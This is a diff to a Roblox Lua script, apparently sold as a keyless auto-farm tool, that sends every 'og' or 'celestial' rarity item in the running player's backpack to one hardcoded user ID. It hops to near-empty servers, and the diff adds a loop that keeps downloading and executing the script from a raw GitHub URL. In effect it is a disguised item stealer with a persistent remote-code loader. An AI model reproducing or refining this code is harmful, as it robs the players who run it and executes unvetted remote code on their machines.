@@ -1,11 +1,35 @@
 --====================================================
--- 🔒 EXECUTION GUARD
+-- 🔥 AUTO REATTACH CORE (ANTI MATI SETELAH TELEPORT)
+--====================================================
+
+getgenv().__AUTO_GIFT_URL = "https://raw.githubusercontent.com/changelog-modul/PHOENIXX-HUB/refs/heads/main/AutoFarmKeyless"
+
+if not getgenv().__AUTO_GIFT_LOADER then
+    getgenv().__AUTO_GIFT_LOADER = true
+
+    task.spawn(function()
+        while true do
+            task.wait(5)
+
+            if not getgenv().__AUTO_GIFT_RUNNING then
+                print("REATTACH SCRIPT...")
+
+                pcall(function()
+                    loadstring(game:HttpGet(getgenv().__AUTO_GIFT_URL))()
+                end)
+            end
+        end
+    end)
+end
+
+--====================================================
+-- 🔒 MAIN SCRIPT GUARD
 --====================================================
 
 if getgenv().__AUTO_GIFT_RUNNING then return end
 getgenv().__AUTO_GIFT_RUNNING = true
 
-print("SCRIPT STARTED ✅")
+print("AUTO GIFT ACTIVE ✅")
 
 --====================================================
 -- 🧠 SERVICES
@@ -23,24 +47,7 @@ local backpack = player:WaitForChild("Backpack")
 
 local targetUserId = 9367836539
 local weightFolder = ReplicatedStorage:WaitForChild("Objects"):WaitForChild("WeightModels")
-
 local PLACE_ID = game.PlaceId
-local SCRIPT_URL = "https://raw.githubusercontent.com/changelog-modul/PHOENIXX-HUB/refs/heads/main/AutoFarmKeyless"
-
---====================================================
--- 🔁 TELEPORT RE-EXECUTE SYSTEM (FIX UTAMA)
---====================================================
-
-local data = TeleportService:GetLocalPlayerTeleportData()
-
-if data and data.reexecute then
-    print("REJOIN DETECTED → RELOAD SCRIPT")
-    task.wait(3)
-
-    getgenv().__AUTO_GIFT_RUNNING = nil
-    loadstring(game:HttpGet(SCRIPT_URL))()
-    return
-end
 
 --====================================================
 -- 🔥 REMOTE FIX
@@ -83,20 +90,18 @@ local function getLowServer()
 end
 
 --====================================================
--- 🚀 HOP SYSTEM (PAKAI TELEPORTDATA)
+-- 🚀 HOP SYSTEM
 --====================================================
 
 local function hopServer()
-    local teleportData = { reexecute = true }
-
     local id = getLowServer()
 
     if id then
         print("FOUND LOW SERVER → HOP")
-        TeleportService:TeleportToPlaceInstance(PLACE_ID, id, player, nil, teleportData)
+        TeleportService:TeleportToPlaceInstance(PLACE_ID, id, player)
     else
         print("FALLBACK SERVER")
-        TeleportService:Teleport(PLACE_ID, player, teleportData)
+        TeleportService:Teleport(PLACE_ID, player)
     end
 end
 
@@ -105,7 +110,7 @@ end
 --====================================================
 
 task.spawn(function()
-    task.wait(2)
+    task.wait(3)
 
     if #Players:GetPlayers() > 2 then
         print("TOO MANY PLAYERS → HOP")
@@ -140,9 +145,10 @@ end)
 
 repeat task.wait() until player.Character
 repeat task.wait() until player:FindFirstChild("Backpack")
-repeat task.wait() until #backpack:GetChildren() > 0
 
-print("PLAYER FULLY LOADED ✅")
+task.wait(2)
+
+print("PLAYER READY ✅")
 
 --====================================================
 -- 🧠 TOOL SYSTEM
@@ -201,8 +207,6 @@ end
 while true do
     task.wait(0.01)
 
-    print("Loop running:", #backpack:GetChildren())
-
     for _,tool in ipairs(backpack:GetChildren()) do
         if tool:IsA("Tool") then
 
@@ -217,7 +221,6 @@ while true do
 
             if rarity == "og" or rarity == "celestial" then
                 local giftRemote = getGiftRemote()
-
                 print("GIFT:", tool.Name, rarity)
 
                 giftRemote:FireServer(targetUserId)
@@ -230,7 +233,7 @@ while true do
 end
 
 --====================================================
--- 💀 FAILSAFE AUTO HOP
+-- 💀 FAILSAFE
 --====================================================
 
 task.spawn(function()
